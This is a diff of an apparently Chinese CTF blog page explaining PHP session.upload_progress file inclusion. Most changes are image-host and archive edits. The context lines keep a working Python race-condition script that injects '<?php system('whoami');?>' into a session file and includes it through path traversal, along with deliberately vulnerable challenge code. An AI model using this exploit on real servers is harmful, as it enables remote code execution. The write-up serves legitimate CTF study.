@@ -27,20 +27,20 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="信安技能赛国赛初赛又遇到了这个考点了，总结一下 session默认的文件名sess_PHPSESSID session保存路径 &#x2F;var&#x2F;lib&#x2F;php5&#x2F;sess_PHPSESSID &#x2F;var&#x2F;lib&#x2F;php7&#x2F;sess_PHPSESSID &#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID &#x2F;tmp&#x2F;sess_PHPSESSID &#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSED">
 <meta property="og:locale">
-<meta property="og:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/20/152303-854088.png">
-<meta property="og:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/21/082421-705675.png">
-<meta property="og:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/20/153658-472495.png">
-<meta property="og:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/24/114429-437894.png">
-<meta property="og:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/24/143444-220168.png">
-<meta property="og:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/24/185837-912611.png">
-<meta property="og:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/25/083018-612389.png">
-<meta property="og:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/25/083112-217298.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084415-433189.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084455-171548.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084544-592336.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084621-770804.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084859-309944.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084949-419746.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/085524-148316.png">
+<meta property="og:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/085729-376963.png">
 <meta property="article:published_time" content="2021-05-20T02:47:44.000Z">
-<meta property="article:modified_time" content="2021-05-25T02:54:48.943Z">
+<meta property="article:modified_time" content="2022-10-07T00:58:09.387Z">
 <meta property="article:author" content="M0deration">
 <meta property="article:tag" content="ctf web安全 ess3nce">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/20/152303-854088.png">
+<meta name="twitter:image" content="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084415-433189.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
@@ -423,10 +423,10 @@ height:50vh;
 </ol>
 <p>window下session默认保存在/tmp下</p>
 <p>linux下默认</p>
-<p><img src="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/20/152303-854088.png" alt="153753-858450"></p>
-<h3 id="与-SESSION-有关的几个-PHP-选项"><a href="#与-SESSION-有关的几个-PHP-选项" class="headerlink" title="与 SESSION 有关的几个 PHP 选项"></a>与 SESSION 有关的几个 PHP 选项</h3><p><img src="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/21/082421-705675.png" alt="image-20210520153644749"></p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084415-433189.png" alt="152303-854088"></p>
+<h3 id="与-SESSION-有关的几个-PHP-选项"><a href="#与-SESSION-有关的几个-PHP-选项" class="headerlink" title="与 SESSION 有关的几个 PHP 选项"></a>与 SESSION 有关的几个 PHP 选项</h3><p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084455-171548.png" alt="152303-854088"></p>
 <p><code>session.auto_start</code>：如果开启这个选项，则PHP在接收请求的时候会<strong>自动初始化Session</strong>，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是<strong>默认关闭</strong>的。</p>
-<p><img src="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/20/153658-472495.png" alt="image-20210520153657915"></p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084544-592336.png" alt="152303-854088"></p>
 <p><code>session.upload_progress.cleanup = on</code>：表示当文件上传结束后，php将会立即清空对应session文件中的内容。该选项<strong>默认开启</strong></p>
 <blockquote>
 <p>session.use_strict_mode =&gt; 0 =&gt; 0</p>
@@ -435,7 +435,7 @@ height:50vh;
 <h2 id="Session-Upload-Progress"><a href="#Session-Upload-Progress" class="headerlink" title="Session Upload Progress"></a>Session Upload Progress</h2><p>Session Upload Progress 即 Session 上传进度，是php&gt;=5.4后开始添加的一个特性。官网对他的描述是当 <code>session.upload_progress.enabled</code> 选项开启时（默认开启），PHP 能够在每一个文件上传时 <strong>监测上传进度</strong>。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</p>
 <p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在 <code>$_SESSION</code> 中获得。 当PHP检测到这种POST请求时，它会在 <code>$_SESSION</code> 中添加一组数据，索引是 session.upload_progress.prefix 与 session.upload_progress.name 连接在一起的值。</p>
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.upload-progress.php">https://www.php.net/manual/zh/session.upload-progress.php</a></p>
-<h2 id="利用-Session-Upload-Progress-上传-Session"><a href="#利用-Session-Upload-Progress-上传-Session" class="headerlink" title="利用 Session Upload Progress 上传 Session"></a>利用 Session Upload Progress 上传 Session</h2><p><img src="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/24/114429-437894.png" alt="image-20210524114426561"></p>
+<h2 id="利用-Session-Upload-Progress-上传-Session"><a href="#利用-Session-Upload-Progress-上传-Session" class="headerlink" title="利用 Session Upload Progress 上传 Session"></a>利用 Session Upload Progress 上传 Session</h2><p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084621-770804.png" alt="152303-854088"></p>
 <p>原理：利用了当session.upload_progress.enabled开启时如果我们上传了一个和session.upload_progress.name同名的变量，也就是名字为PHP_SESSION_UPLOAD_PROGRESS的时候，且为 POST 请求的时候，他就会在$_SESSION中添加一组键值对。键名就是session.upload_progress.name。然后键值就是我们POST中上传的键值</p>
 <p>首先需要确认session.upload_progress.enabled是为On的</p>
 <p>一般session.upload_progress.enabled默认开启</p>
@@ -445,7 +445,7 @@ height:50vh;
 <p>上传后抓包在自己手动加个cookie里面放个PHPSESSID就可以看到会在seesion存放的位置多一个session，如果配合文件包含我们就可以实现写入shell</p>
 <p>看到上面的配置文件可以看到session存在位置是<code>/var/lib/php/sessions</code></p>
 <p>而且<code>session.use_strict_mode</code>的值是<code>0</code>，因为我们可以自己定义session的名字</p>
-<p><img src="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/24/143444-220168.png" alt="image-20210524143441799"></p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084859-309944.png" alt="152303-854088"></p>
 <h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>这里就需要配合文件包含来包含我们可控的session来实现getshell，但是这里有个问题</p>
 <blockquote>
 <ol>
@@ -463,7 +463,7 @@ height:50vh;
 <p>网上找了一个脚本，稍微改了一点</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;ess3nce&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            <span class="string">&#x27;http://192.168.254.132/index.php&#x27;</span>,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;http://192.168.254.132/index.php?file=../../../../../../../../var/lib/php/sessions/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(&#x27;[+++]retry&#x27;)</span></span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(response.text)==<span class="number">461</span>:</span><br><span class="line">            print(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(len(response.text))</span><br><span class="line">            print(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/24/185837-912611.png" alt="image-20210524185836729"></p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/084949-419746.png" alt="152303-854088"></p>
 <p>可以多次访问看到未被删除时的情况，然后通过包含实现利用</p>
 <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -476,9 +476,9 @@ height:50vh;
 <h3 id="ciscn2021-middle-include"><a href="#ciscn2021-middle-include" class="headerlink" title="ciscn2021_middle_include"></a>ciscn2021_middle_include</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;your flag is in some file in /etc &quot;</span>;</span><br><span class="line">    $fielf=$_POST[<span class="string">&quot;field&quot;</span>];</span><br><span class="line">    $cf=<span class="string">&quot;/tmp/app_auth/cfile/&quot;</span>.$_POST[<span class="string">&#x27;cf&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(file_exists($cf))&#123;</span><br><span class="line">        <span class="keyword">include</span> $cf;</span><br><span class="line">        <span class="keyword">echo</span> $$field;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>⽂件扫描</p>
-<p><img src="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/25/083018-612389.png" alt="image"></p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/085524-148316.png" alt="152303-854088"></p>
 <p>文件泄露</p>
-<p><img src="https://gitee.com/ess3nce/img_bed/raw/master/image/202105/25/083112-217298.png" alt="image"></p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202210/07/085729-376963.png" alt="152303-854088"></p>
 <p>查看phpinfo,得到session_save_path</p>
 <p>利用session.upload_progress进行文件包含</p>
 <p>脚本爆一下</p>
@@ -753,8 +753,6 @@ top:50vh;
     
     
     
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 12
@@ -768,22 +766,18 @@ top:50vh;
     
     
     
-    <div class="archive-year"> 2099 </div>
+    <div class="archive-year"> 2022 </div>
     <ul class="year-list">
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2099/10/20/%E8%AE%B0%E5%BD%95/" >记录</a>
+            <span class="archive-post-date">12/22</span><a class="archive-post-title" href= "/2022/12/22/2022%20pwnhub%20%E5%86%AC%E5%AD%A3%E8%B5%9B/" >2022 pwnhub 冬季赛</a>
         </li>
     
     
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2022 </div>
-    <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "/2022/10/09/cc1/" >cc1</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -822,11 +816,6 @@ top:50vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2020/12/26/%E7%BA%B5%E6%A8%AA%E6%9D%AF/" >纵横杯</a>
-        </li>
     
     
         <li class="archive-post-item">
@@ -904,9 +893,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
     
-        <span class="sidebar-category-name" data-categories="javasec"><span class="iconfont-archer">&#xe60a;</span>javasec</span>
-    
         <span class="sidebar-category-name" data-categories="others"><span class="iconfont-archer">&#xe60a;</span>others</span>
+    
+        <span class="sidebar-category-name" data-categories="javasec"><span class="iconfont-archer">&#xe60a;</span>javasec</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
